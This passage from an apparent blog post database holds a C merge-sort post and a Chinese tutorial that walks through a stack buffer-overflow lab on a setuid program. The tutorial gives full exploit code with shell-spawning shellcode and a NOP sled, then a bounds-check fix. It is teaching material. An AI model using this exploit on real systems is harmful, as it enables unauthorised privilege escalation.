class=\"line\">    <span class=\"built_in\">else</span> server(addr);<span class=\"comment\">//the main process will work as the server part</span></span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Sort List use merge sort","date":"2015-10-16T21:08:58.000Z","_content":"Why you are so sad? Just because you can not sort a list?\nIf someone want you to sort a list, what will you do? quicksort? No.\nMerge sort is your choose! How much do you think a merge sort will cost? $O(n^2)$ ? $O(n^3)$ ? No!\nIt ONLY take you $O(n * log_2n)$! Buy now, you can get a input part freely!\n<!--more-->\nFor merge sort, it's very useful. I don't want to say how merge sort works. If you want that, just Google \"Merge sort\".\nI just want to practise. Here is my code.\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nusing namespace std;\nstruct Node{\n\tint val;\n\tNode * next;\n}node;\n\nNode * merge(Node * s, int len){\n    if(len == 1) return s;\n    Node * a = s, *tmp;\n    Node * res = NULL, *now = NULL;\n    for(int i = 1;i < len >> 1;++ i)\n        s = s -> next;\n    tmp = s -> next;\n    s -> next = NULL;// find the start of the second part and set the end of the first part to NULL\n    s = tmp;\n    a = merge(a, len >> 1);\n    s = merge(s, len - (len >> 1));\n    if(a -> val < s -> val) res = a, a = a -> next;\n    else res = s, s = s-> next;\n    now = res;\n    while(a && s){\n        if(a -> val < s -> val){\n            now -> next = a;\n            now = a;\n            a = a -> next;\n        }else{\n            now -> next = s;\n            now = s;\n            s = s -> next;\n        }\n    }\n    if(!a) now -> next = s;\n    else now -> next = a;\n    return res;\n}\nint main(){\n    int n = 0;\n    int val = 0;\n    Node * head, * tail;\n    scanf(\"%d\",&n);\n    scanf(\"%d\",&val);\n    Node * tmp = (Node *)malloc(sizeof(Node));\n    head = tmp;\n    head -> val = val;\n    tail = head;\n    for(int i = 0;i < n - 1;++ i){\n        scanf(\"%d\",&val);\n        tmp = (Node *)malloc(sizeof(Node));\n        tmp -> next = NULL;\n        tmp -> val = val;\n        tail -> next = tmp;\n        tail = tmp;\n    }\n    head = merge(head, n);\n    while(head){\n        printf(\"%d \",head -> val);\n        head = head -> next;\n    }\n    printf(\"\\n\");\n    return 0;\n\t\n}\n```\n","source":"_posts/SortListusemergesort.md","raw":"title: \"Sort List use merge sort\"\ndate: 2015-10-16 21:08:58\ntags: Algorithm\n---\nWhy you are so sad? Just because you can not sort a list?\nIf someone want you to sort a list, what will you do? quicksort? No.\nMerge sort is your choose! How much do you think a merge sort will cost? $O(n^2)$ ? $O(n^3)$ ? No!\nIt ONLY take you $O(n * log_2n)$! Buy now, you can get a input part freely!\n<!--more-->\nFor merge sort, it's very useful. I don't want to say how merge sort works. If you want that, just Google \"Merge sort\".\nI just want to practise. Here is my code.\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nusing namespace std;\nstruct Node{\n\tint val;\n\tNode * next;\n}node;\n\nNode * merge(Node * s, int len){\n    if(len == 1) return s;\n    Node * a = s, *tmp;\n    Node * res = NULL, *now = NULL;\n    for(int i = 1;i < len >> 1;++ i)\n        s = s -> next;\n    tmp = s -> next;\n    s -> next = NULL;// find the start of the second part and set the end of the first part to NULL\n    s = tmp;\n    a = merge(a, len >> 1);\n    s = merge(s, len - (len >> 1));\n    if(a -> val < s -> val) res = a, a = a -> next;\n    else res = s, s = s-> next;\n    now = res;\n    while(a && s){\n        if(a -> val < s -> val){\n            now -> next = a;\n            now = a;\n            a = a -> next;\n        }else{\n            now -> next = s;\n            now = s;\n            s = s -> next;\n        }\n    }\n    if(!a) now -> next = s;\n    else now -> next = a;\n    return res;\n}\nint main(){\n    int n = 0;\n    int val = 0;\n    Node * head, * tail;\n    scanf(\"%d\",&n);\n    scanf(\"%d\",&val);\n    Node * tmp = (Node *)malloc(sizeof(Node));\n    head = tmp;\n    head -> val = val;\n    tail = head;\n    for(int i = 0;i < n - 1;++ i){\n        scanf(\"%d\",&val);\n        tmp = (Node *)malloc(sizeof(Node));\n        tmp -> next = NULL;\n        tmp -> val = val;\n        tail -> next = tmp;\n        tail = tmp;\n    }\n    head = merge(head, n);\n    while(head){\n        printf(\"%d \",head -> val);\n        head = head -> next;\n    }\n    printf(\"\\n\");\n    return 0;\n\t\n}\n```\n","slug":"SortListusemergesort","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681uy001bwypdckihdeao","content":"<p>Why you are so sad? Just because you can not sort a list?<br>If someone want you to sort a list, what will you do? quicksort? No.<br>Merge sort is your choose! How much do you think a merge sort will cost? $O(n^2)$ ? $O(n^3)$ ? No!<br>It ONLY take you $O(n * log_2n)$! Buy now, you can get a input part freely!<br><a id=\"more\"></a><br>For merge sort, it’s very useful. I don’t want to say how merge sort works. If you want that, just Google “Merge sort”.<br>I just want to practise. Here is my code.</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\">using namespace std<span class=\"comment\">;</span></span><br><span class=\"line\">struct Node&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">int</span> val<span class=\"comment\">;</span></span><br><span class=\"line\">\tNode * <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;node<span class=\"comment\">;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Node * merge(Node * s, <span class=\"built_in\">int</span> len)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(len == <span class=\"number\">1</span>) <span class=\"keyword\">return</span> s<span class=\"comment\">;</span></span><br><span class=\"line\">    Node * a = s, *tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    Node * res = <span class=\"literal\">NULL</span>, *<span class=\"built_in\">now</span> = <span class=\"literal\">NULL</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"built_in\">int</span> i = <span class=\"number\">1</span><span class=\"comment\">;i &lt; len &gt;&gt; 1;++ i)</span></span><br><span class=\"line\">        s = s -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    tmp = s -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    s -&gt; <span class=\"keyword\">next</span> = <span class=\"literal\">NULL</span><span class=\"comment\">;// find the start of the second part and set the end of the first part to NULL</span></span><br><span class=\"line\">    s = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    a = merge(a, len &gt;&gt; <span class=\"number\">1</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    s = merge(s, len - (len &gt;&gt; <span class=\"number\">1</span>))<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(a -&gt; val &lt; s -&gt; val) res = a, a = a -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> res = s, s = s-&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">now</span> = res<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(a &amp;&amp; s)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a -&gt; val &lt; s -&gt; val)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = a<span class=\"comment\">;</span></span><br><span class=\"line\">            <span class=\"built_in\">now</span> = a<span class=\"comment\">;</span></span><br><span class=\"line\">            a = a -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = s<span class=\"comment\">;</span></span><br><span class=\"line\">            <span class=\"built_in\">now</span> = s<span class=\"comment\">;</span></span><br><span class=\"line\">            s = s -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!a) <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = s<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = a<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res<span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> n = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> val = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    Node * head, * tail<span class=\"comment\">;</span></span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n)<span class=\"comment\">;</span></span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;val)<span class=\"comment\">;</span></span><br><span class=\"line\">    Node * tmp = (Node *)malloc(sizeof(Node))<span class=\"comment\">;</span></span><br><span class=\"line\">    head = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    head -&gt; val = val<span class=\"comment\">;</span></span><br><span class=\"line\">    tail = head<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"built_in\">int</span> i = <span class=\"number\">0</span><span class=\"comment\">;i &lt; n - 1;++ i)&#123;</span></span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;val)<span class=\"comment\">;</span></span><br><span class=\"line\">        tmp = (Node *)malloc(sizeof(Node))<span class=\"comment\">;</span></span><br><span class=\"line\">        tmp -&gt; <span class=\"keyword\">next</span> = <span class=\"literal\">NULL</span><span class=\"comment\">;</span></span><br><span class=\"line\">        tmp -&gt; val = val<span class=\"comment\">;</span></span><br><span class=\"line\">        tail -&gt; <span class=\"keyword\">next</span> = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">        tail = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    head = merge(head, n)<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(head)&#123;</span><br><span class=\"line\">        printf(<span class=\"string\">\"%d \"</span>,head -&gt; val)<span class=\"comment\">;</span></span><br><span class=\"line\">        head = head -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(<span class=\"string\">\"\\n\"</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","excerpt":"<p>Why you are so sad? Just because you can not sort a list?<br>If someone want you to sort a list, what will you do? quicksort? No.<br>Merge sort is your choose! How much do you think a merge sort will cost? $O(n^2)$ ? $O(n^3)$ ? No!<br>It ONLY take you $O(n * log_2n)$! Buy now, you can get a input part freely!<br>","more":"<br>For merge sort, it’s very useful. I don’t want to say how merge sort works. If you want that, just Google “Merge sort”.<br>I just want to practise. Here is my code.</p>\n<figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\">using namespace std<span class=\"comment\">;</span></span><br><span class=\"line\">struct Node&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">int</span> val<span class=\"comment\">;</span></span><br><span class=\"line\">\tNode * <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">&#125;node<span class=\"comment\">;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Node * merge(Node * s, <span class=\"built_in\">int</span> len)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(len == <span class=\"number\">1</span>) <span class=\"keyword\">return</span> s<span class=\"comment\">;</span></span><br><span class=\"line\">    Node * a = s, *tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    Node * res = <span class=\"literal\">NULL</span>, *<span class=\"built_in\">now</span> = <span class=\"literal\">NULL</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"built_in\">int</span> i = <span class=\"number\">1</span><span class=\"comment\">;i &lt; len &gt;&gt; 1;++ i)</span></span><br><span class=\"line\">        s = s -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    tmp = s -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    s -&gt; <span class=\"keyword\">next</span> = <span class=\"literal\">NULL</span><span class=\"comment\">;// find the start of the second part and set the end of the first part to NULL</span></span><br><span class=\"line\">    s = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    a = merge(a, len &gt;&gt; <span class=\"number\">1</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    s = merge(s, len - (len &gt;&gt; <span class=\"number\">1</span>))<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(a -&gt; val &lt; s -&gt; val) res = a, a = a -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> res = s, s = s-&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">now</span> = res<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(a &amp;&amp; s)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a -&gt; val &lt; s -&gt; val)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = a<span class=\"comment\">;</span></span><br><span class=\"line\">            <span class=\"built_in\">now</span> = a<span class=\"comment\">;</span></span><br><span class=\"line\">            a = a -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = s<span class=\"comment\">;</span></span><br><span class=\"line\">            <span class=\"built_in\">now</span> = s<span class=\"comment\">;</span></span><br><span class=\"line\">            s = s -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!a) <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = s<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"built_in\">now</span> -&gt; <span class=\"keyword\">next</span> = a<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> res<span class=\"comment\">;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> n = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"built_in\">int</span> val = <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">    Node * head, * tail<span class=\"comment\">;</span></span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n)<span class=\"comment\">;</span></span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;val)<span class=\"comment\">;</span></span><br><span class=\"line\">    Node * tmp = (Node *)malloc(sizeof(Node))<span class=\"comment\">;</span></span><br><span class=\"line\">    head = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    head -&gt; val = val<span class=\"comment\">;</span></span><br><span class=\"line\">    tail = head<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"built_in\">int</span> i = <span class=\"number\">0</span><span class=\"comment\">;i &lt; n - 1;++ i)&#123;</span></span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;val)<span class=\"comment\">;</span></span><br><span class=\"line\">        tmp = (Node *)malloc(sizeof(Node))<span class=\"comment\">;</span></span><br><span class=\"line\">        tmp -&gt; <span class=\"keyword\">next</span> = <span class=\"literal\">NULL</span><span class=\"comment\">;</span></span><br><span class=\"line\">        tmp -&gt; val = val<span class=\"comment\">;</span></span><br><span class=\"line\">        tail -&gt; <span class=\"keyword\">next</span> = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">        tail = tmp<span class=\"comment\">;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    head = merge(head, n)<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(head)&#123;</span><br><span class=\"line\">        printf(<span class=\"string\">\"%d \"</span>,head -&gt; val)<span class=\"comment\">;</span></span><br><span class=\"line\">        head = head -&gt; <span class=\"keyword\">next</span><span class=\"comment\">;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(<span class=\"string\">\"\\n\"</span>)<span class=\"comment\">;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span><span class=\"comment\">;</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Stackoverflow","date":"2015-03-05T19:28:28.000Z","_content":"说一下很久以前就做过最近有遇到了的缓冲区溢出问题吧。\n<!--more-->\n当然最开始要放上来的还是有漏洞的程序。为了节省篇幅，仅仅把主函数粘上来，也就是我们有漏洞的地方。程序如下：\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/stat.h>\n#include \"common.h\"\n\nint main(int argc, char *argv[]) {\n  uid_t userid = getuid();\n  int printing = 1;\n  int fd;\n  char search_buffer[100];\n\n  if (argc > 1) {\n    strcpy(search_buffer, argv[1]);\n  } else {\n    search_buffer[0] = '\\0'; // Null byte - empty string\n  }\n\n  fd = open(NOTE_FILE, O_RDONLY);\n  if (fd == -1) {\n    fatal(\"Problem opening file in main()\");\n  }\n  while(printing) {\n    printing = print_notes(fd, userid, search_buffer);\n  }\n  printf(\"--------[ END OF DATA ]--------\\n\");\n  close(fd);\n\n  return 0;\n}\n```\n##程序攻击##\n\n学过信息安全的大约都能看出来，中间strcpy函数复制的时候没有检查输入参数的边界。因此只要输入的稍微长点的参数，就会产生溢出。接下来我们就在ubuntu 下做一下这个实验吧。\n先说一下基本原理吧。在每个函数的特定位置，存放着该函数的返回地址。这个返回地址可能会被有溢出漏洞的数组，函数覆盖。如果这个返回地址被用新的地址覆盖了，而且新的地址指向我们另外一段程序，那样的话我们就可以通过这个程序获得更高的权限了。\n第一步，编译程序。截图如下：\n![com.png](/image/Stackoverflow/2.png)\n编译这一步必须做对了。不然就不能继续下去。下面我解释一下这几个有关参数：\n```\ngcc -o searchnote -z execstack -fno-stack-protector -g searchnote.c\n```\n这句代码是这样的。在现代编译器中，gcc会对很多安全问题进行处理。比方说禁止数据堆栈区的程序运行，缓冲区溢出处理等等。一旦gcc处理了这些问题，我们的缓冲区溢出攻击也就没办法继续下去了。\n这里 -z execstack 就是用来告诉编译器栈上的程序是可以运行的。 -fno-stack-protector 是用来禁用堆栈溢出保护的。这样下去之后，就可以运行下一步了。\n**PS:gcc4.6以上好像这两句代码不好使了，堆栈保护一直关不掉。最后我只好使用gdb继续进行试验了**\n第二步，设计我们的攻击程序。程序代码如下：\n\n```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\"\n;\n#define OFFSET 500\n\nunsigned long getESP(){\n    __asm__(\"movl %ESP,%EAX\");\n}\n// This code builds the malicious input required to trigger our buffer overflow,and then\n// invokes the searchnote binary with it. Once finished, this code should yield a root shell.\nint main(int argc, char *argv[]) {\nchar *command, *buffer;\nunsigned long addr;\naddr = getESP() + OFFSET;\ncommand = calloc(2000, sizeof(char));\nfprintf(stderr, \"Using Offset: 0x%x\\nShellcode Size:%d\\n\",addr,sizeof(shellcode));\nstrcpy(command, \"./searchnote \\'\"); // start command buffer\nbuffer = command + strlen(command); // set buffer at the end\n// fill buffer with enough copies of an address within the NOP sled to overwrite the return address\nmemset(buffer,0x90,1024);\n// append suitably long NOP sled to give a large enough target for the previous part to work reliably\n\nint i;\nfor(i = 0;i < 200;i += 4){\nbuffer[i] = addr & 0x000000ff;\nbuffer[i + 1] = (addr & 0x0000ff00) >> 8; \nbuffer[i + 2] = (addr & 0x00ff0000) >> 16;\nbuffer[i + 3] = (addr & 0xff000000) >> 24;\n}\n\nmemcpy(buffer + 900,shellcode,sizeof(shellcode));\n\n// append our shellcode to buffer\nstrcat(command, \"\\'\");\nsystem(command); // run exploit\nfree(command);\n}\n\n```\n关键部分在这里\n![code1.png](/image/Stackoverflow/5.png)\n下面我解释一下这个代码。\n```\n#define OFFSET 500\n\nunsigned long getESP(){\n    __asm__(\"movl %ESP,%EAX\");\n}\nunsigned long addr;\naddr = getESP() + OFFSET;\n```\n这部分代码，我们用来得到当前堆栈的起始位置。OFFSET是我们猜测的偏移量。addr就是我们的shellcode的大概位置了。我们只要把shellcode附着在buffer的后边，然后让这个addr指向shellcode大概的前边就可以。这里我们用到一个东西叫做NOP sled。\nNOP sled就是当程序指针指导NOP的时候，它会继续往下寻找可执行程序。一直“滑”到可执行的程序位置。这样的话我们把shellcode的前边用0x90填充，在一大堆0x90(NOP)的包围下，addr只要指向shellcode前边的某个NOP即可，程序指针就会滑下去，滑到我们的shellcode然后执行。\n\n```\n// fill buffer with enough copies of an address within the NOP sled to overwrite the return address\nmemset(buffer,0x90,1024);\n```\n这一段代码就是用0x90来填充buffer，长度为1024.\n\n```\nint i;\nfor(i = 0;i < 200;i += 4){\nbuffer[i] = addr & 0x000000ff;\nbuffer[i + 1] = (addr & 0x0000ff00) >> 8; \nbuffer[i + 2] = (addr & 0x00ff0000) >> 16;\nbuffer[i + 3] = (addr & 0xff000000) >> 24;\n}\n\nmemcpy(buffer + 900,shellcode,sizeof(shellcode));\n\n```\n这一部分是这样，因为我们不确定存着函数返回地址的地址，我们就暴力的从buffer的开始，不断的用addr来填充所有的部分。一直填充到200个为止。由于返回地址的对齐，所以中间一定能覆盖到返回地址，指向addr。然后返回到这个addr之后一直沿着0x90滑下去。滑到shellcode就成功了。\n\n下边我们看一下具体攻击的情况。首先如下图：\n\n\n![setuid.png](/image/Stackoverflow/8.png)\nchmod就是另外一个技术，所谓setuid，也就是让别的用户运行这个程序享有某些权限。这里我们这么写之后，用另外一个新建用户\"eve\"执行程序，也就有了和程序创建用户一样的效果。\n我们用gdb对searchnote进行一下调试，观察一下内存的变化过程。\n\n\n![stack1.png](/image/Stackoverflow/3.png)\n这里我们看到，在运行strcpy之前，我们的内存数据是正常的。这个时候main的返回地址应该是在0xbffff250左右。具体哪个已经不重要了。因为在缓冲区覆盖完成之后，可能的位置已经全变成指向shellcode的位置了。在上图的下方，大片的地址已经被我们得到的addr地址，也就是指向我们shellcode的地址覆盖。这个地址是0xbffff45c。其实可以看出来我们猜测的偏移量的大了。大约在0xbffff2f0就可以写入了。但是由于我们中间全用0x90填充，返回指针一直会滑到我们的shellcode的位置。\n\n\n![stack2.png](/image/Stackoverflow/4.png)\n这张图片揭示了我们shellcode附近的情况。0xbffff45c也就是程序返回执行的位置，在前边隐去了。程序指针会顺着NOP sled 一直滑到shellcode复婚，也就是0xbffff5a0的位置。开始执行shellcode。\n\n\n![result.png](/image/Stackoverflow/1.png)\n运行完shellcode就是上边这个结果了。\n**PS:预期结果应该是获取root权限。但是由于程序创建者没有这个权限，同时ubuntu系统有bash的保护机制，导致没能获取root权限。这里我们仅仅获取了程序创建者的权限，但是这已经证明了我们成功的进行了缓冲区溢出攻击**\n\n##程序漏洞修补##\n程序修补比较简单，只要检查输入长度然后加以判断就好。关键代码如下：\n```\nstruct stack_frame {\n  struct stack_frame* next;\n  void* ret;\n};\n\nvoid ** get_addr_of_ret_addr() {\n  /* x86/gcc-specific: this tells gcc that the fp\n     variable should be set to the %ebp register\n     which keeps the frame pointer */\n  register struct stack_frame* fp asm(\"ebp\");\n  // the rest just walks through the linked list\n  struct stack_frame* frame = fp; // This is the stack frame of get_ebp\n  // Move down the stack to the stack frame which called get_ebp\n  frame = frame->next;\n  // We want to return the *address* of the retur address \n  return &frame->ret;\n}\n```\n上边这些代码的作用是获得当前函数的返回地址的存储地址。\n\n![code_fix.png](/image/Stackoverflow/6.png)\n\n```\n  char search_buffer[100];\n  void ** addr;\n  addr = get_addr_of_ret_addr();\n  int gap = (char *)addr - search_buffer;\n  printf(\"%d\\n\",strlen(argv[1])); \n  if(gap <= strlen(argv[1])){\n      printf(\"The args is too long\\n\");\n      return 0;\n  }\t\n  if (argc > 1) {\n    strcpy(search_buffer, argv[1]);\n  } else {\n    search_buffer[0] = '\\0'; // Null byte - empty string\n  